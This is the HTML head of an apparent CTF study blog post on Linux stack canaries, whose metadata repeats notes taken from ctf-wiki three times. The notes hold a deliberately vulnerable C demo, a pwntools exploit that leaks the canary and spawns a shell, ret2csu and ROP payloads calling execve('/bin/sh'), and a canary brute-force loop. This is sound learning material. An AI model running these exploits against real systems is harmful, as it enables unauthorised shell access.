<!doctype html>
<!--
  Minimal Mistakes Jekyll Theme 4.17.2 by Michael Rose
  Copyright 2013-2019 Michael Rose - mademistakes.com | @mmistakes
  Free for personal and commercial use under the MIT license
  https://github.com/mmistakes/minimal-mistakes/blob/master/LICENSE
-->
<html lang="en" class="no-js">
  <head>
    <meta charset="utf-8">

<!-- begin _includes/seo.html --><title>Pwnit 1  -  My way, though far away</title>
<meta name="description" content="  pwn学习资料，来自ctf-wiki。安全机制-CanaryCanarycanary 不管是实现还是设计思想都比较简单高效，就是插入一个值，在 stack overflow 发生的 高危区域的尾部，当函数返回之时检测 canary 的值是否经过了改变，以此来判断 stack/buffer overflow 是否发生。原理：-fstack-protector 启用保护，不过只为局部变量中含有数组的函数插入保护-fstack-protector-all 启用保护，为所有函数插入保护-fstack-protector-strong-fstack-protector-explicit 只对有明确stack_protect attribute的函数开启保护-fno-stack-protector 禁用保护.Canary 与 windows 下的 GS 保护都是防止栈溢出的有效手段，它的出现很大程度上防止了栈溢出的出现，并且由于它几乎并不消耗系统资源，所以现在成了 linux 下保护机制的标配。当程序启用 Canary 编译后，在函数序言部分会取 fs 寄存器 0x28 处的值，存放在栈中 %ebp-0x8 的位置。 这个操作即为向栈中插入 Canary 值，代码如下：mov    rax, qword ptr fs:[0x28]mov    qword ptr [rbp - 8], rax在函数返回之前，会将该值取出，并与 fs:0x28 的值进行异或。如果异或的结果为 0，说明 canary 未被修改，函数会正常返回，这个操作即为检测是否发生栈溢出。mov    rdx,QWORD PTR [rbp-0x8]xor    rdx,QWORD PTR fs:0x28je     0x4005d7 &lt;main+65&gt;call   0x400460 &lt;__stack_chk_fail@plt&gt;如果 canary 已经被非法修改，此时程序流程会走到 __stack_chk_fail。__stack_chk_fail 也是位于 glibc 中的函数，默认情况下经过 ELF 的延迟绑定，glibc2.28中定义如下。这意味可以通过劫持 __stack_chk_fail的 got 值劫持流程或者利用 __stack_chk_fail 泄漏内容 (参见 stack smash)。进一步，对于 Linux 来说，fs 寄存器实际指向的是当前栈的 TLS 结构，fs:0x28 指向的正是 stack_guard。如果存在溢出可以覆盖位于 TLS 中保存的 Canary 值那么就可以实现绕过保护机制。事实上，TLS 中的值由函数 security_init 进行初始化。Canary 设计为以字节 \x00 结尾，本意是为了保证 Canary 可以截断字符串。 泄露栈中的 Canary 的思路是覆盖 Canary 的低字节，来打印出剩余的 Canary 部分。 这种利用方式需要存在合适的输出函数，并且可能需要第一溢出泄露 Canary，之后再次溢出控制执行流程。demo源代码如下：#include &lt;stdio.h&gt;#include &lt;unistd.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;void getshell(void) {    system(&quot;/bin/sh&quot;);}void init() {    setbuf(stdin, NULL);    setbuf(stdout, NULL);    setbuf(stderr, NULL);}void vuln() {    char buf[100];    for(int i=0;i&lt;2;i++){        read(0, buf, 0x200);        printf(buf);    }}int main(void) {    init();    puts(&quot;Hello Hacker!&quot;);    vuln();    return 0;}编译为 32bit 程序，开启 NX，ASLR，Canary 保护。makefile文件如下。CC = gccSRCS = canary.cEXEC = $(SRCS:.c=)X86 = -m32X64 = DEBUG = -g# ------------- security ----------------NO_CANARY = -fno-stack-protectorCANARY = -fstack-protectorALL_CANARY = -fstack-protector-allNO_NX = -z execstackNX = -z noexecstackNO_PIE = -no-piePIE = -fpie -pieALL_PIE = -fPIE -pieNO_RELRO = -z norelroPART_RELRO = -z lazyALL_RELRO = -z now# ------------- security ----------------# X86 DEBUG NO_CANARY NO_NX NO_PIE PART_RELROALL_NO = $(X86) $(DEBUG) $(NO_CANARY) $(NO_NX) $(NO_PIE) $(PART_RELRO)# X86 DEBUG NO_CANARY NX NO_PIE PART_RELROONLY_NX = $(X86) $(DEBUG) $(NO_CANARY) $(NX) $(NO_PIE) $(PART_RELRO)# X86 DEBUG CANARY NX NO_PIE PART_RELROCANARY_NX = $(X86) $(DEBUG) $(CANARY) $(NX) $(NO_PIE) $(PART_RELRO)# X86 DEBUG CANARY NX PIE PART_RELROCANARY_NX_PIE = $(X86) $(DEBUG) $(CANARY) $(NX) $(PIE) $(PART_RELRO)CFLAGS = $(CANARY_NX)${EXEC}:	$(CC) $(CFLAGS) $(SRCS) -o $(EXEC)all:	${EXEC}clean:	rm $(EXEC)首先通过覆盖 Canary 最后一个 \x00 字节来打印出 4 位的 Canary 之后，计算好偏移，将 Canary 填入到相应的溢出位置，实现 Ret 到 getshell 函数中。#!/usr/bin/env python# -*- coding: utf-8 -*-__author__=&#39;zjgcjy&#39;import osimport sysfrom pwn import *#from LibcSearcher import *usage = &#39;&#39;&#39;	usage: python2 exp.py file index &#39;&#39;&#39;if len(sys.argv) != 3:	print usage	exit(-1)vul = &#39;./&#39; + sys.argv[1]elf = ELF(vul)context.arch = elf.archcontext.terminal = [&#39;gnome-terminal&#39;, &#39;-x&#39;, &#39;sh&#39;, &#39;-c&#39;]index = eval(sys.argv[2])if index == 0:	context.log_level = &#39;debug&#39;	libc = elf.libc	s = process(vul)elif index == 1:    context.log_level = &#39;debug&#39;    libc = elf.libc    s = gdb.debug(vul, &#39;&#39;&#39;break _startcontinueb main&#39;&#39;&#39;)    pause()elif index == 2:	context.log_level = &#39;debug&#39;	libc = elf.libc	s = process(vul)	#gdb.attach(proc.pidof(s)[0])	gdb.attach(s, &quot;b main&quot;)	pause()elif index == 3:	context.log_level = &#39;debug&#39;	lib = &#39;~/work/ctf/2019/tamuctf/pwn/3/libc.so.6&#39;	libc = ELF(lib)	s = process(vul, env={&#39;LD_PRELOAD&#39;: lib})		gdb.attach(s, &quot;b * 0x40080b&quot;)	pause()elif index == 4:	context.log_level = &#39;debug&#39;	ip = &#39;pwn.jarvisoj.com&#39; 	port = 1234	s = remote(ip, port)    else:	print &#39;wrong&#39;def libSearch(addr, fname = &#39;write&#39;):	obj = LibcSearcher(fname, addr)	#obj.db = &#39;libc6_2.23-0ubuntu10_i386.symbols&#39;	libc_base = addr - obj.dump(fname)	system_addr = libc_base + obj.dump(&#39;system&#39;)	binsh_addr = libc_base + obj.dump(&#39;str_bin_sh&#39;)	execve_addr = libc_base + obj.dump(&#39;execve&#39;)	log.success(&quot;libc_base -&gt; {:#x}&quot;.format(libc_base))&#39;&#39;&#39;d = DynELF(leak, elf = ELF(argv[1]))system_addr = d.lookup(&#39;system&#39;, &#39;libc&#39;)success(&quot;system_addr -&gt; {:#x}&quot;.format(system_addr))&#39;&#39;&#39;def leak(address, ret, offset, length = 4):    payload = &#39;a&#39; * offset + p32(elf.plt[&#39;write&#39;]) + p32(ret)     payload += p32(1) + p32(address) + p32(length)    s.send(payload)    data = s.recv(length)    log.info(&quot;%#x =&gt; %s&quot; % (address, (data or &#39;&#39;).encode(&#39;hex&#39;)))    return datadef csu(offset, r12, r15, r14, r13, ret, rbx = 0, rbp = 1):    # pop rbx,rbp,r12,r13,r14,r15    # rbx = 0,    # rbp = 1    # call r12    # rdi = edi = r15d    # rsi = r14    # rdx = r13    payload = &#39;a&#39; * offset + p64(csu_second_addr)    payload += p64(rbx) + p64(rbp) + p64(r12) + p64(r13) + p64(r14) + p64(r15)    payload += p64(csu_first_addr)    payload += &#39;a&#39; * 0x38    payload += p64(ret)    s.send(payload)    sleep(0.5)def csu_make():	csu_first_addr = 0x4005F0	csu_second_addr = 0x40060A	main_addr = 0x40057D	s.recv()	# write(1,got[&#39;write&#39;],8)	csu(136, elf.got[&#39;write&#39;], 1, elf.got[&#39;write&#39;], 8, main_addr)	libc.address = u64(s.recv(8)) - libc.symbols[&#39;write&#39;]	log.success(&quot;libc.address -&gt; {:#x}&quot;.format(libc.address))	s.recv()	# read(0,bss,16)	# read execve_addr and /bin/sh\x00	csu(136, elf.got[&#39;read&#39;], 0, elf.bss(), 16, main_addr)	s.send(p64(libc.symbols[&#39;execve&#39;]) + &#39;/bin/sh\x00&#39;)	s.recv()	# execve(&#39;/bin/sh&#39;, 0, 0)	csu(136, elf.bss(), elf.bss()+8, 0, 0, 0xdeadbeef)	s.interactive()def exception_canary():	environ_addr = libc.symbols[&#39;environ&#39;]	payload = flat([cyclic(0x128), environ_addr])	stack_address = u64(s.recvuntil(&#39;\x7f&#39;)[-6:].ljust(8, &#39;\x00&#39;))	success(&quot;stack_address -&gt; {:#x}&quot;.format(stack_address))	payload = flat([cyclic(0x128), stack_address - 0x168])	payload = flat([&#39;1&#39;*8, rdi_ret, elf.got[&#39;setvbuf&#39;], elf.plt[&#39;puts&#39;], vuln_addr]).ljust(80, &#39;a&#39;)	payload += flat([fake_rbp, leave_ret_addr])	libc.address = u64(s.recvuntil(&#39;\x7f&#39;)[-6:].ljust(8, &#39;\x00&#39;)) - libc.symbols[&#39;setvbuf&#39;]	rdx_rsi_ret = libc.address + 0x1150c9	sh_addr = next(libc.search(&quot;/bin/sh&quot;))	execve_addr = libc.sym[&#39;execve&#39;]	payload = flat([&#39;2&#39; *8, rdi_ret, sh_addr, rdx_rsi_ret, 0, 0, execve_addr]).ljust(80,&#39;b&#39;)	payload += flat([fake_rbp - 0x30, leave_ret_addr])def main():	s.recv()	s.sendline(cyclic(100))	s.recvuntil(&quot;\x0a&quot;)	canary = u32(s.recv(3).rjust(4, &#39;\x00&#39;))	log.success(&quot;canary -&gt; {:#x}&quot;.format(canary))		getshell = elf.sym[&quot;getshell&quot;]		s.sendline(cyclic(100) + p32(canary) + &#39;a&#39;*12 + p32(getshell))	s.recv()	s.interactive()	if __name__==&#39;__main__&#39;:	main()	爆破canaryone-by-one对于 Canary，不仅每次进程重启后的 Canary 不同 (相比 GS，GS 重启后是相同的)，而且同一个进程中的每个线程的 Canary 也不同。 但是存在一类通过 fork 函数开启子进程交互的题目，因为 fork 函数会直接拷贝父进程的内存，因此每次创建的子进程的 Canary 是相同的。我们可以利用这样的特点，彻底逐个字节将 Canary 爆破出来。 在著名的 offset2libc 绕过 linux64bit 的所有保护的文章中，作者就是利用这样的方式爆破得到的 Canary:print &quot;[+] Brute forcing stack canary &quot;start = len(p)stop = len(p)+8while len(p) &lt; stop:   for i in xrange(0,256):      res = send2server(p + chr(i))      if res != &quot;&quot;:         p = p + chr(i)         #print &quot;\t[+] Byte found 0x%02x&quot; % i         break      if i == 255:         print &quot;[-] Exploit failed&quot;         sys.exit(-1)canary = p[stop:start-1:-1].encode(&quot;hex&quot;)print &quot;   [+] SSP value is 0x%s&quot; % canary劫持__stack_chk_fail 函数已知 Canary 失败的处理逻辑会进入到 __stack_chk_failed 函数，__stack_chk_failed 函数是一个普通的延迟绑定函数，可以通过修改 GOT 表劫持这个函数。覆盖 TLS 中储存的 Canary 值已知 Canary 储存在 TLS 中，在函数返回前会使用这个值进行对比。当溢出尺寸较大时，可以同时覆盖栈上储存的 Canary 和 TLS 储存的 Canary 实现绕过。">


  <meta name="author" content="zjgcjy">


<meta property="og:type" content="article">
<meta property="og:locale" content="en_US">
<meta property="og:site_name" content="My way, though far away">
<meta property="og:title" content="Pwnit 1">
<meta property="og:url" content="https://zjgcjy.github.io/posts/2019-03/Pwnit-1.html">


  <meta property="og:description" content="  pwn学习资料，来自ctf-wiki。安全机制-CanaryCanarycanary 不管是实现还是设计思想都比较简单高效，就是插入一个值，在 stack overflow 发生的 高危区域的尾部，当函数返回之时检测 canary 的值是否经过了改变，以此来判断 stack/buffer overflow 是否发生。原理：-fstack-protector 启用保护，不过只为局部变量中含有数组的函数插入保护-fstack-protector-all 启用保护，为所有函数插入保护-fstack-protector-strong-fstack-protector-explicit 只对有明确stack_protect attribute的函数开启保护-fno-stack-protector 禁用保护.Canary 与 windows 下的 GS 保护都是防止栈溢出的有效手段，它的出现很大程度上防止了栈溢出的出现，并且由于它几乎并不消耗系统资源，所以现在成了 linux 下保护机制的标配。当程序启用 Canary 编译后，在函数序言部分会取 fs 寄存器 0x28 处的值，存放在栈中 %ebp-0x8 的位置。 这个操作即为向栈中插入 Canary 值，代码如下：mov    rax, qword ptr fs:[0x28]mov    qword ptr [rbp - 8], rax在函数返回之前，会将该值取出，并与 fs:0x28 的值进行异或。如果异或的结果为 0，说明 canary 未被修改，函数会正常返回，这个操作即为检测是否发生栈溢出。mov    rdx,QWORD PTR [rbp-0x8]xor    rdx,QWORD PTR fs:0x28je     0x4005d7 &lt;main+65&gt;call   0x400460 &lt;__stack_chk_fail@plt&gt;如果 canary 已经被非法修改，此时程序流程会走到 __stack_chk_fail。__stack_chk_fail 也是位于 glibc 中的函数，默认情况下经过 ELF 的延迟绑定，glibc2.28中定义如下。这意味可以通过劫持 __stack_chk_fail的 got 值劫持流程或者利用 __stack_chk_fail 泄漏内容 (参见 stack smash)。进一步，对于 Linux 来说，fs 寄存器实际指向的是当前栈的 TLS 结构，fs:0x28 指向的正是 stack_guard。如果存在溢出可以覆盖位于 TLS 中保存的 Canary 值那么就可以实现绕过保护机制。事实上，TLS 中的值由函数 security_init 进行初始化。Canary 设计为以字节 \x00 结尾，本意是为了保证 Canary 可以截断字符串。 泄露栈中的 Canary 的思路是覆盖 Canary 的低字节，来打印出剩余的 Canary 部分。 这种利用方式需要存在合适的输出函数，并且可能需要第一溢出泄露 Canary，之后再次溢出控制执行流程。demo源代码如下：#include &lt;stdio.h&gt;#include &lt;unistd.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;void getshell(void) {    system(&quot;/bin/sh&quot;);}void init() {    setbuf(stdin, NULL);    setbuf(stdout, NULL);    setbuf(stderr, NULL);}void vuln() {    char buf[100];    for(int i=0;i&lt;2;i++){        read(0, buf, 0x200);        printf(buf);    }}int main(void) {    init();    puts(&quot;Hello Hacker!&quot;);    vuln();    return 0;}编译为 32bit 程序，开启 NX，ASLR，Canary 保护。makefile文件如下。CC = gccSRCS = canary.cEXEC = $(SRCS:.c=)X86 = -m32X64 = DEBUG = -g# ------------- security ----------------NO_CANARY = -fno-stack-protectorCANARY = -fstack-protectorALL_CANARY = -fstack-protector-allNO_NX = -z execstackNX = -z noexecstackNO_PIE = -no-piePIE = -fpie -pieALL_PIE = -fPIE -pieNO_RELRO = -z norelroPART_RELRO = -z lazyALL_RELRO = -z now# ------------- security ----------------# X86 DEBUG NO_CANARY NO_NX NO_PIE PART_RELROALL_NO = $(X86) $(DEBUG) $(NO_CANARY) $(NO_NX) $(NO_PIE) $(PART_RELRO)# X86 DEBUG NO_CANARY NX NO_PIE PART_RELROONLY_NX = $(X86) $(DEBUG) $(NO_CANARY) $(NX) $(NO_PIE) $(PART_RELRO)# X86 DEBUG CANARY NX NO_PIE PART_RELROCANARY_NX = $(X86) $(DEBUG) $(CANARY) $(NX) $(NO_PIE) $(PART_RELRO)# X86 DEBUG CANARY NX PIE PART_RELROCANARY_NX_PIE = $(X86) $(DEBUG) $(CANARY) $(NX) $(PIE) $(PART_RELRO)CFLAGS = $(CANARY_NX)${EXEC}:	$(CC) $(CFLAGS) $(SRCS) -o $(EXEC)all:	${EXEC}clean:	rm $(EXEC)首先通过覆盖 Canary 最后一个 \x00 字节来打印出 4 位的 Canary 之后，计算好偏移，将 Canary 填入到相应的溢出位置，实现 Ret 到 getshell 函数中。#!/usr/bin/env python# -*- coding: utf-8 -*-__author__=&#39;zjgcjy&#39;import osimport sysfrom pwn import *#from LibcSearcher import *usage = &#39;&#39;&#39;	usage: python2 exp.py file index &#39;&#39;&#39;if len(sys.argv) != 3:	print usage	exit(-1)vul = &#39;./&#39; + sys.argv[1]elf = ELF(vul)context.arch = elf.archcontext.terminal = [&#39;gnome-terminal&#39;, &#39;-x&#39;, &#39;sh&#39;, &#39;-c&#39;]index = eval(sys.argv[2])if index == 0:	context.log_level = &#39;debug&#39;	libc = elf.libc	s = process(vul)elif index == 1:    context.log_level = &#39;debug&#39;    libc = elf.libc    s = gdb.debug(vul, &#39;&#39;&#39;break _startcontinueb main&#39;&#39;&#39;)    pause()elif index == 2:	context.log_level = &#39;debug&#39;	libc = elf.libc	s = process(vul)	#gdb.attach(proc.pidof(s)[0])	gdb.attach(s, &quot;b main&quot;)	pause()elif index == 3:	context.log_level = &#39;debug&#39;	lib = &#39;~/work/ctf/2019/tamuctf/pwn/3/libc.so.6&#39;	libc = ELF(lib)	s = process(vul, env={&#39;LD_PRELOAD&#39;: lib})		gdb.attach(s, &quot;b * 0x40080b&quot;)	pause()elif index == 4:	context.log_level = &#39;debug&#39;	ip = &#39;pwn.jarvisoj.com&#39; 	port = 1234	s = remote(ip, port)    else:	print &#39;wrong&#39;def libSearch(addr, fname = &#39;write&#39;):	obj = LibcSearcher(fname, addr)	#obj.db = &#39;libc6_2.23-0ubuntu10_i386.symbols&#39;	libc_base = addr - obj.dump(fname)	system_addr = libc_base + obj.dump(&#39;system&#39;)	binsh_addr = libc_base + obj.dump(&#39;str_bin_sh&#39;)	execve_addr = libc_base + obj.dump(&#39;execve&#39;)	log.success(&quot;libc_base -&gt; {:#x}&quot;.format(libc_base))&#39;&#39;&#39;d = DynELF(leak, elf = ELF(argv[1]))system_addr = d.lookup(&#39;system&#39;, &#39;libc&#39;)success(&quot;system_addr -&gt; {:#x}&quot;.format(system_addr))&#39;&#39;&#39;def leak(address, ret, offset, length = 4):    payload = &#39;a&#39; * offset + p32(elf.plt[&#39;write&#39;]) + p32(ret)     payload += p32(1) + p32(address) + p32(length)    s.send(payload)    data = s.recv(length)    log.info(&quot;%#x =&gt; %s&quot; % (address, (data or &#39;&#39;).encode(&#39;hex&#39;)))    return datadef csu(offset, r12, r15, r14, r13, ret, rbx = 0, rbp = 1):    # pop rbx,rbp,r12,r13,r14,r15    # rbx = 0,    # rbp = 1    # call r12    # rdi = edi = r15d    # rsi = r14    # rdx = r13    payload = &#39;a&#39; * offset + p64(csu_second_addr)    payload += p64(rbx) + p64(rbp) + p64(r12) + p64(r13) + p64(r14) + p64(r15)    payload += p64(csu_first_addr)    payload += &#39;a&#39; * 0x38    payload += p64(ret)    s.send(payload)    sleep(0.5)def csu_make():	csu_first_addr = 0x4005F0	csu_second_addr = 0x40060A	main_addr = 0x40057D	s.recv()	# write(1,got[&#39;write&#39;],8)	csu(136, elf.got[&#39;write&#39;], 1, elf.got[&#39;write&#39;], 8, main_addr)	libc.address = u64(s.recv(8)) - libc.symbols[&#39;write&#39;]	log.success(&quot;libc.address -&gt; {:#x}&quot;.format(libc.address))	s.recv()	# read(0,bss,16)	# read execve_addr and /bin/sh\x00	csu(136, elf.got[&#39;read&#39;], 0, elf.bss(), 16, main_addr)	s.send(p64(libc.symbols[&#39;execve&#39;]) + &#39;/bin/sh\x00&#39;)	s.recv()	# execve(&#39;/bin/sh&#39;, 0, 0)	csu(136, elf.bss(), elf.bss()+8, 0, 0, 0xdeadbeef)	s.interactive()def exception_canary():	environ_addr = libc.symbols[&#39;environ&#39;]	payload = flat([cyclic(0x128), environ_addr])	stack_address = u64(s.recvuntil(&#39;\x7f&#39;)[-6:].ljust(8, &#39;\x00&#39;))	success(&quot;stack_address -&gt; {:#x}&quot;.format(stack_address))	payload = flat([cyclic(0x128), stack_address - 0x168])	payload = flat([&#39;1&#39;*8, rdi_ret, elf.got[&#39;setvbuf&#39;], elf.plt[&#39;puts&#39;], vuln_addr]).ljust(80, &#39;a&#39;)	payload += flat([fake_rbp, leave_ret_addr])	libc.address = u64(s.recvuntil(&#39;\x7f&#39;)[-6:].ljust(8, &#39;\x00&#39;)) - libc.symbols[&#39;setvbuf&#39;]	rdx_rsi_ret = libc.address + 0x1150c9	sh_addr = next(libc.search(&quot;/bin/sh&quot;))	execve_addr = libc.sym[&#39;execve&#39;]	payload = flat([&#39;2&#39; *8, rdi_ret, sh_addr, rdx_rsi_ret, 0, 0, execve_addr]).ljust(80,&#39;b&#39;)	payload += flat([fake_rbp - 0x30, leave_ret_addr])def main():	s.recv()	s.sendline(cyclic(100))	s.recvuntil(&quot;\x0a&quot;)	canary = u32(s.recv(3).rjust(4, &#39;\x00&#39;))	log.success(&quot;canary -&gt; {:#x}&quot;.format(canary))		getshell = elf.sym[&quot;getshell&quot;]		s.sendline(cyclic(100) + p32(canary) + &#39;a&#39;*12 + p32(getshell))	s.recv()	s.interactive()	if __name__==&#39;__main__&#39;:	main()	爆破canaryone-by-one对于 Canary，不仅每次进程重启后的 Canary 不同 (相比 GS，GS 重启后是相同的)，而且同一个进程中的每个线程的 Canary 也不同。 但是存在一类通过 fork 函数开启子进程交互的题目，因为 fork 函数会直接拷贝父进程的内存，因此每次创建的子进程的 Canary 是相同的。我们可以利用这样的特点，彻底逐个字节将 Canary 爆破出来。 在著名的 offset2libc 绕过 linux64bit 的所有保护的文章中，作者就是利用这样的方式爆破得到的 Canary:print &quot;[+] Brute forcing stack canary &quot;start = len(p)stop = len(p)+8while len(p) &lt; stop:   for i in xrange(0,256):      res = send2server(p + chr(i))      if res != &quot;&quot;:         p = p + chr(i)         #print &quot;\t[+] Byte found 0x%02x&quot; % i         break      if i == 255:         print &quot;[-] Exploit failed&quot;         sys.exit(-1)canary = p[stop:start-1:-1].encode(&quot;hex&quot;)print &quot;   [+] SSP value is 0x%s&quot; % canary劫持__stack_chk_fail 函数已知 Canary 失败的处理逻辑会进入到 __stack_chk_failed 函数，__stack_chk_failed 函数是一个普通的延迟绑定函数，可以通过修改 GOT 表劫持这个函数。覆盖 TLS 中储存的 Canary 值已知 Canary 储存在 TLS 中，在函数返回前会使用这个值进行对比。当溢出尺寸较大时，可以同时覆盖栈上储存的 Canary 和 TLS 储存的 Canary 实现绕过。">



  <meta property="og:image" content="https://zjgcjy.github.io/assets/images/bio-photo.jpg">



  <meta name="twitter:site" content="@zjgcjy">
  <meta name="twitter:title" content="Pwnit 1">
  <meta name="twitter:description" content="  pwn学习资料，来自ctf-wiki。安全机制-CanaryCanarycanary 不管是实现还是设计思想都比较简单高效，就是插入一个值，在 stack overflow 发生的 高危区域的尾部，当函数返回之时检测 canary 的值是否经过了改变，以此来判断 stack/buffer overflow 是否发生。原理：-fstack-protector 启用保护，不过只为局部变量中含有数组的函数插入保护-fstack-protector-all 启用保护，为所有函数插入保护-fstack-protector-strong-fstack-protector-explicit 只对有明确stack_protect attribute的函数开启保护-fno-stack-protector 禁用保护.Canary 与 windows 下的 GS 保护都是防止栈溢出的有效手段，它的出现很大程度上防止了栈溢出的出现，并且由于它几乎并不消耗系统资源，所以现在成了 linux 下保护机制的标配。当程序启用 Canary 编译后，在函数序言部分会取 fs 寄存器 0x28 处的值，存放在栈中 %ebp-0x8 的位置。 这个操作即为向栈中插入 Canary 值，代码如下：mov    rax, qword ptr fs:[0x28]mov    qword ptr [rbp - 8], rax在函数返回之前，会将该值取出，并与 fs:0x28 的值进行异或。如果异或的结果为 0，说明 canary 未被修改，函数会正常返回，这个操作即为检测是否发生栈溢出。mov    rdx,QWORD PTR [rbp-0x8]xor    rdx,QWORD PTR fs:0x28je     0x4005d7 &lt;main+65&gt;call   0x400460 &lt;__stack_chk_fail@plt&gt;如果 canary 已经被非法修改，此时程序流程会走到 __stack_chk_fail。__stack_chk_fail 也是位于 glibc 中的函数，默认情况下经过 ELF 的延迟绑定，glibc2.28中定义如下。这意味可以通过劫持 __stack_chk_fail的 got 值劫持流程或者利用 __stack_chk_fail 泄漏内容 (参见 stack smash)。进一步，对于 Linux 来说，fs 寄存器实际指向的是当前栈的 TLS 结构，fs:0x28 指向的正是 stack_guard。如果存在溢出可以覆盖位于 TLS 中保存的 Canary 值那么就可以实现绕过保护机制。事实上，TLS 中的值由函数 security_init 进行初始化。Canary 设计为以字节 \x00 结尾，本意是为了保证 Canary 可以截断字符串。 泄露栈中的 Canary 的思路是覆盖 Canary 的低字节，来打印出剩余的 Canary 部分。 这种利用方式需要存在合适的输出函数，并且可能需要第一溢出泄露 Canary，之后再次溢出控制执行流程。demo源代码如下：#include &lt;stdio.h&gt;#include &lt;unistd.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;void getshell(void) {    system(&quot;/bin/sh&quot;);}void init() {    setbuf(stdin, NULL);    setbuf(stdout, NULL);    setbuf(stderr, NULL);}void vuln() {    char buf[100];    for(int i=0;i&lt;2;i++){        read(0, buf, 0x200);        printf(buf);    }}int main(void) {    init();    puts(&quot;Hello Hacker!&quot;);    vuln();    return 0;}编译为 32bit 程序，开启 NX，ASLR，Canary 保护。makefile文件如下。CC = gccSRCS = canary.cEXEC = $(SRCS:.c=)X86 = -m32X64 = DEBUG = -g# ------------- security ----------------NO_CANARY = -fno-stack-protectorCANARY = -fstack-protectorALL_CANARY = -fstack-protector-allNO_NX = -z execstackNX = -z noexecstackNO_PIE = -no-piePIE = -fpie -pieALL_PIE = -fPIE -pieNO_RELRO = -z norelroPART_RELRO = -z lazyALL_RELRO = -z now# ------------- security ----------------# X86 DEBUG NO_CANARY NO_NX NO_PIE PART_RELROALL_NO = $(X86) $(DEBUG) $(NO_CANARY) $(NO_NX) $(NO_PIE) $(PART_RELRO)# X86 DEBUG NO_CANARY NX NO_PIE PART_RELROONLY_NX = $(X86) $(DEBUG) $(NO_CANARY) $(NX) $(NO_PIE) $(PART_RELRO)# X86 DEBUG CANARY NX NO_PIE PART_RELROCANARY_NX = $(X86) $(DEBUG) $(CANARY) $(NX) $(NO_PIE) $(PART_RELRO)# X86 DEBUG CANARY NX PIE PART_RELROCANARY_NX_PIE = $(X86) $(DEBUG) $(CANARY) $(NX) $(PIE) $(PART_RELRO)CFLAGS = $(CANARY_NX)${EXEC}:	$(CC) $(CFLAGS) $(SRCS) -o $(EXEC)all:	${EXEC}clean:	rm $(EXEC)首先通过覆盖 Canary 最后一个 \x00 字节来打印出 4 位的 Canary 之后，计算好偏移，将 Canary 填入到相应的溢出位置，实现 Ret 到 getshell 函数中。#!/usr/bin/env python# -*- coding: utf-8 -*-__author__=&#39;zjgcjy&#39;import osimport sysfrom pwn import *#from LibcSearcher import *usage = &#39;&#39;&#39;	usage: python2 exp.py file index &#39;&#39;&#39;if len(sys.argv) != 3:	print usage	exit(-1)vul = &#39;./&#39; + sys.argv[1]elf = ELF(vul)context.arch = elf.archcontext.terminal = [&#39;gnome-terminal&#39;, &#39;-x&#39;, &#39;sh&#39;, &#39;-c&#39;]index = eval(sys.argv[2])if index == 0:	context.log_level = &#39;debug&#39;	libc = elf.libc	s = process(vul)elif index == 1:    context.log_level = &#39;debug&#39;    libc = elf.libc    s = gdb.debug(vul, &#39;&#39;&#39;break _startcontinueb main&#39;&#39;&#39;)    pause()elif index == 2:	context.log_level = &#39;debug&#39;	libc = elf.libc	s = process(vul)	#gdb.attach(proc.pidof(s)[0])	gdb.attach(s, &quot;b main&quot;)	pause()elif index == 3:	context.log_level = &#39;debug&#39;	lib = &#39;~/work/ctf/2019/tamuctf/pwn/3/libc.so.6&#39;	libc = ELF(lib)	s = process(vul, env={&#39;LD_PRELOAD&#39;: lib})		gdb.attach(s, &quot;b * 0x40080b&quot;)	pause()elif index == 4:	context.log_level = &#39;debug&#39;	ip = &#39;pwn.jarvisoj.com&#39; 	port = 1234	s = remote(ip, port)    else:	print &#39;wrong&#39;def libSearch(addr, fname = &#39;write&#39;):	obj = LibcSearcher(fname, addr)	#obj.db = &#39;libc6_2.23-0ubuntu10_i386.symbols&#39;	libc_base = addr - obj.dump(fname)	system_addr = libc_base + obj.dump(&#39;system&#39;)	binsh_addr = libc_base + obj.dump(&#39;str_bin_sh&#39;)	execve_addr = libc_base + obj.dump(&#39;execve&#39;)	log.success(&quot;libc_base -&gt; {:#x}&quot;.format(libc_base))&#39;&#39;&#39;d = DynELF(leak, elf = ELF(argv[1]))system_addr = d.lookup(&#39;system&#39;, &#39;libc&#39;)success(&quot;system_addr -&gt; {:#x}&quot;.format(system_addr))&#39;&#39;&#39;def leak(address, ret, offset, length = 4):    payload = &#39;a&#39; * offset + p32(elf.plt[&#39;write&#39;]) + p32(ret)     payload += p32(1) + p32(address) + p32(length)    s.send(payload)    data = s.recv(length)    log.info(&quot;%#x =&gt; %s&quot; % (address, (data or &#39;&#39;).encode(&#39;hex&#39;)))    return datadef csu(offset, r12, r15, r14, r13, ret, rbx = 0, rbp = 1):    # pop rbx,rbp,r12,r13,r14,r15    # rbx = 0,    # rbp = 1    # call r12    # rdi = edi = r15d    # rsi = r14    # rdx = r13    payload = &#39;a&#39; * offset + p64(csu_second_addr)    payload += p64(rbx) + p64(rbp) + p64(r12) + p64(r13) + p64(r14) + p64(r15)    payload += p64(csu_first_addr)    payload += &#39;a&#39; * 0x38    payload += p64(ret)    s.send(payload)    sleep(0.5)def csu_make():	csu_first_addr = 0x4005F0	csu_second_addr = 0x40060A	main_addr = 0x40057D	s.recv()	# write(1,got[&#39;write&#39;],8)	csu(136, elf.got[&#39;write&#39;], 1, elf.got[&#39;write&#39;], 8, main_addr)	libc.address = u64(s.recv(8)) - libc.symbols[&#39;write&#39;]	log.success(&quot;libc.address -&gt; {:#x}&quot;.format(libc.address))	s.recv()	# read(0,bss,16)	# read execve_addr and /bin/sh\x00	csu(136, elf.got[&#39;read&#39;], 0, elf.bss(), 16, main_addr)	s.send(p64(libc.symbols[&#39;execve&#39;]) + &#39;/bin/sh\x00&#39;)	s.recv()	# execve(&#39;/bin/sh&#39;, 0, 0)	csu(136, elf.bss(), elf.bss()+8, 0, 0, 0xdeadbeef)	s.interactive()def exception_canary():	environ_addr = libc.symbols[&#39;environ&#39;]	payload = flat([cyclic(0x128), environ_addr])	stack_address = u64(s.recvuntil(&#39;\x7f&#39;)[-6:].ljust(8, &#39;\x00&#39;))	success(&quot;stack_address -&gt; {:#x}&quot;.format(stack_address))	payload = flat([cyclic(0x128), stack_address - 0x168])	payload = flat([&#39;1&#39;*8, rdi_ret, elf.got[&#39;setvbuf&#39;], elf.plt[&#39;puts&#39;], vuln_addr]).ljust(80, &#39;a&#39;)	payload += flat([fake_rbp, leave_ret_addr])	libc.address = 